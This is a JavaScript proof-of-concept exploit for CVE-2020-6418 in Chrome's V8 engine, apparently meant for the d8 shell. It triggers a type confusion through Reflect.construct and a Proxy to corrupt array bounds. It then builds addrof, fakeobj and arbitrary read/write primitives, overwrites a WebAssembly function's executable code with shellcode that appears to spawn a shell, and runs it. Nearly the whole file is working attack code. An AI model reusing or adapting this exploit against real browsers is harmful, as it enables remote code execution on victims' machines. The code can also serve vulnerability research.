load("toolkit.js");

// Flags: --allow-natives-syntax

// NOTE: magicの領域とoobの領域を各要素数又はhole数で調整する


// Preparation
let magic = [13.37, 13.37 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,  13.137, 13.37, 13.37]; // Hi! I am HOLEY_DOUBLE_ELEMENTS.
let oob = [];
let unboxed;
let boxed;
let craft;

function empty() {}

function f(p) {
	// 2261634.000004069 == 0x4141414100002222
	magic.push(Reflect.construct(empty, arguments, p) === Function ? 156842065920.05 : 156842065920.05); // Oops! push thinks that magic is still HOLEY_DOUBLE_ELEMENTS!
	for (var i = 0; i < 0x10000; ++i) {};
}

let p = new Proxy(Object,{
	get: function(){
		magic[0] = {}; // Now, magic is HOLEY_ELEMENTS!
		oob = [1.337, 1.337, 1.337, 1.337, 1.337, 1.337, 1.337, 1.337, 1.337];
		unboxed = [5.5, 5.5, 5.5, 5.5];
		boxed = [x,x,x,x];
		craft = new Float64Array([2.1, 2.2, 2.3, 2.4]);
		return Object.prototype;
	}
})

function main(p) {
	for (var i = 0; i < 0x10000; ++i) {};
	f(p);
}

function startup(){
	for (var i = 0; i < 0x10000; ++i) { empty(); };
	main(empty);
	main(empty);
	main(p);

	console.log("[!] EXPLOIT POC FOR CVE-2020-6418");
	console.log(`[+] We got OOB array: oob.length => ${oob.length}`);
}

function init(){
	for(let i=0;i<5;i++){
		magic.pop();
	}
}

//%PrepareFunctionForOptimization(empty);
//%PrepareFunctionForOptimization(f);
//%PrepareFunctionForOptimization(main);
//main(empty);
//main(empty);
//%OptimizeFunctionOnNextCall(main);
//main(p);

// marking object
let x = {a:1337};

init();
startup();

//%DebugPrint(oob);
//%DebugPrint(unboxed);
//%DebugPrint(boxed);
//%DebugPrint(craft);

let unboxed_map = Int64.fromDouble(oob[9]);
let boxed_map = Int64.fromDouble(oob[21]);
let craft_map = Int64.fromDouble(oob[48]);
let high = new Int64(Int64.fromDouble(oob[53]));
console.log("[*] unboxed map:", unboxed_map);
console.log("[*] boxed map:", boxed_map);
console.log("[*] craft map:", craft_map);
console.log("[*] leaked higher addr:",high);

let unboxed_bstore = Int64.fromDouble(oob[17]);
let boxed_bstore = Int64.fromDouble(oob[22]);
let craft_bstore = Int64.fromDouble(oob[49]);
console.log("[*] unboxed bstore:", unboxed_bstore);
console.log("[*] boxed bstore:",boxed_bstore);
console.log("[*] craft bstore:", craft_bstore)


function fixed(high_addr, low_addr){

	let high = high_addr.toString().slice(2,6);
	let low = low_addr.toString().slice(9);
	if(high[3] == 0){
		high = high.slice(0, -1);
	}
	let fixed_addr = (new Int64("0x" + high + low));
	return fixed_addr
	//return (new Int64(fixed_addr));
}

function addrof(obj){
	let orgiginal_x = oob[21];
	boxed[0] = obj;
	oob[21] = unboxed_map.asDouble();
	let addr = Int64.fromDouble(boxed[0]);
	oob[21] = orgiginal_x;

	// shit
	addr = fixed(high, addr);
	return addr;
}

function fakeobj(addr){
	let orgiginal_x = oob[22];
	unboxed[0] = addr.asDouble();
	oob[22] = unboxed_bstore.asDouble();
	let obj = boxed[0];
	oob[22] = orgiginal_x;

	return obj;
}

function read8_improve(addr){
	let orgiginal_x = oob[53];
	let orgiginal_y = oob[54];
	oob[53] = addr.asDouble(); // overwrite craft's higher backing store address
	oob[54] = 0; // overwrite craft's lower backing store address
	let got_addr = Int64.fromDouble(craft[0]);
	oob[53] = orgiginal_x;
	oob[54] = orgiginal_y;
	return got_addr;
}

function write8_improve(addr, data){
	let orgiginal_x = oob[53];
	let orgiginal_y = oob[54];
	oob[53] = addr.asDouble(); // overwrite craft's higher backing store address
	oob[54] = 0; // overwrite craft's lower backing store address
	craft[0] = data.asDouble();
	oob[53] = orgiginal_x;
	oob[54] = orgiginal_y;
}

function write_shellcode(addr, shellcode){
	for(let i=0;i<shellcode.length;++i){
		write8_improve(Int64.add(addr,i*0x4), (new Int64(shellcode[i])));
	}
}


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

let wasm_func_addr = addrof(f);
let sfi_addr = Int64.sub(Int64.sub(wasm_func_addr, 0x28), 0x0);
console.log("[*] sfi:", sfi_addr);
let wasm_exported_func_data = read8_improve(Int64.add(Int64.sub(sfi_addr, 0x1), 0x4));
wasm_exported_func_data = fixed(high, wasm_exported_func_data);
console.log("[*] exported:", wasm_exported_func_data);
let code_addr = read8_improve(Int64.sub(Int64.sub(wasm_exported_func_data, 0x1), 0x70));
console.log("[*] code addr:", code_addr);

let shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x90050f3b];
write_shellcode(code_addr, shellcode);
f(); // fire!

// debug
//for(let i=0;i<100;i++){
//	console.log(i, ":", Int64.fromDouble(oob[i]));
//}
//%SystemBreak();
